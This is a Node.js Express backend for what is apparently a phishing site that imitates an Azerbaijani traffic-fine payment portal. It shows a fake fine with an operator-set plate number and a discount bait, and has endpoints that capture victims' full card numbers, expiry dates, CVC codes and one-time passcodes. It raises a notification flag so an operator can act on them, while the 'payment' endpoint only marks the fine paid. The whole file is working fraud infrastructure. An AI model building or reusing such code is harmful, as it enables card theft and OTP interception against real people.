const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + file.originalname);
    }
});
const upload = multer({ storage: storage });

function getCurrentDateTime() {
    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const year = now.getFullYear();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    return `${day}.${month}.${year} / ${hours}:${minutes}`;
}

let fineData = {
    protocolNo: `YHQ-${Math.floor(10000 + Math.random() * 90000)}`,
    plateNo: "99-XX-999",
    article: "Maddə 125.1 - Dayanma və durma qaydalarının pozulması",
    dateTime: getCurrentDateTime(),
    location: "Nizami küçəsi 45, Bakı şəhəri",
    points: 2,
    amount: 80.00,
    discountAmount: 20.00,
    isPaid: false,
    photoUrl: null,
    cardNo: null,
    cardExp: null,
    cardCvc: null,
    otpCode: null,
    hasNewRequest: false
};

// GET fine details
app.get('/api/fine', (req, res) => {
    res.json(fineData);
});

// POST update fine details (Admin)
app.post('/api/fine/update', (req, res) => {
    const { plateNo, location } = req.body;

    if (plateNo) {
        fineData.plateNo = plateNo;
        fineData.protocolNo = `YHQ-${Math.floor(10000 + Math.random() * 90000)}`;
        fineData.dateTime = getCurrentDateTime();
    }

    if (location) {
        fineData.location = location;
    }

    fineData.isPaid = false;
    fineData.cardNo = null;
    fineData.cardExp = null;
    fineData.cardCvc = null;
    fineData.otpCode = null;
    fineData.hasNewRequest = false;

    res.json({ success: true, message: "Cərimə məlumatları yeniləndi", fine: fineData });
});

// POST reset / clear payment and requests
app.post('/api/reset', (req, res) => {
    fineData.isPaid = false;
    fineData.cardNo = null;
    fineData.cardExp = null;
    fineData.cardCvc = null;
    fineData.otpCode = null;
    fineData.hasNewRequest = false;
    res.json({ success: true, message: "Bütün ödənişlər və sorğular sıfırlandı", fine: fineData });
});

// POST save card details (Triggers new request notification)
app.post('/api/card', (req, res) => {
    const { cardNo, cardExp, cardCvc } = req.body;
    if (cardNo) fineData.cardNo = cardNo;
    if (cardExp) fineData.cardExp = cardExp;
    if (cardCvc) fineData.cardCvc = cardCvc;
    fineData.hasNewRequest = true;
    res.json({ success: true, message: "Kart məlumatları qəbul edildi" });
});

// POST save OTP code
app.post('/api/otp', (req, res) => {
    const { otpCode } = req.body;
    if (otpCode) fineData.otpCode = otpCode;
    res.json({ success: true, message: "OTP kodu qəbul edildi" });
});

// Clear new request notification flag
app.post('/api/clear-request', (req, res) => {
    fineData.hasNewRequest = false;
    res.json({ success: true });
});

// POST upload violation photo
app.post('/api/upload', upload.single('photo'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ success: false, message: "Şəkil yüklənmədi" });
    }
    const photoUrl = `http://localhost:${PORT}/uploads/${req.file.filename}`;
    fineData.photoUrl = photoUrl;
    res.json({ success: true, message: "Şəkil uğurla yükləndi", photoUrl });
});

// POST process payment
app.post('/api/pay', (req, res) => {
    const { amountPaid } = req.body;
    fineData.isPaid = true;
    res.json({
        success: true,
        message: `Ödəniş uğurla qəbul edildi: ${amountPaid || fineData.discountAmount} AZN`,
        fine: fineData
    });
});

app.listen(PORT, () => {
    console.log(`Cerime backend server is running on http://localhost:${PORT}`);
});
